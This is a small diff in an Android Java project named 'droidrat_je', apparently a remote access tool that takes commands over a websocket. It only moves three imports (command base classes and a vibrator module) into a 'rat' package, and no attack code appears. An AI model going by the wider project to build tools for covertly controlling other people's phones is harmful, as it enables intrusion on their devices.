@@ -3,9 +3,9 @@ package com.je_chen.droidrat_je.command;
 import android.content.Context;
 import android.util.Log;
 
-import com.je_chen.droidrat_je.command.process_super.CommandFather;
-import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;
-import com.je_chen.droidrat_je.modules.vibrator.VibratorSystem;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;
+import com.je_chen.droidrat_je.rat.modules.vibrator.VibratorSystem;
 
 import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;
 
